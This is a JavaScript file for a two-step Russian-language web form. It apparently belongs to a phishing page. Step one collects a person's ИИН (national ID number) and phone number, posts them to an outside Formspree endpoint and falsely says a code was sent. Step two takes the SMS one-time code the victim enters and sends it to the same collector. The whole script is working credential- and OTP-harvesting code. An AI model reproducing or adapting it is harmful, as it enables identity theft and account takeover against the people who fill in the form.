document.addEventListener("DOMContentLoaded", function () {
    console.log("Script loaded"); // Debugging

    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const submitStep1 = document.getElementById("submitStep1");
    const submitStep2 = document.getElementById("submitStep2");
    const smsField = document.getElementById("smsCode");

    submitStep1.addEventListener("click", function (event) {
        console.log("Step 1 Submit Clicked"); // Debugging
        event.preventDefault();

        const iinValue = document.getElementById("iin").value.trim();
        const phoneValue = document.getElementById("phone").value.trim();

        if (iinValue && phoneValue) {
            console.log("Sending first step data...");

            fetch("https://formspree.io/f/mpzozzqb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    "ИИН": iinValue,
                    "Номер телефона": phoneValue
                })
            }).then(response => {
                if (response.ok) {
                    console.log("Step 1 Data Sent Successfully");
                    step1.style.display = "none"; // Hide first step
                    step2.style.display = "block"; // Show second step
                    alert("Код отправлен на номер " + phoneValue);
                } else {
                    console.error("Error sending data");
                    alert("Ошибка отправки, попробуйте снова.");
                }
            }).catch(error => {
                console.error("Fetch error:", error);
                alert("Ошибка сети.");
            });
        } else {
            alert("Пожалуйста, заполните оба поля!");
        }
    });

    submitStep2.addEventListener("click", function (event) {
        console.log("Step 2 Submit Clicked"); // Debugging
        event.preventDefault();

        const smsValue = smsField.value.trim();
        if (smsValue) {
            fetch("https://formspree.io/f/mpzozzqb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ "SMS Код": smsValue })
            }).then(response => {
                if (response.ok) {
                    alert("SMS код успешно отправлен!");
                } else {
                    alert("Ошибка отправки кода.");
                }
            }).catch(error => {
                console.error("Fetch error:", error);
                alert("Ошибка сети.");
            });
        } else {
            alert("Введите код из SMS!");
        }
    });
});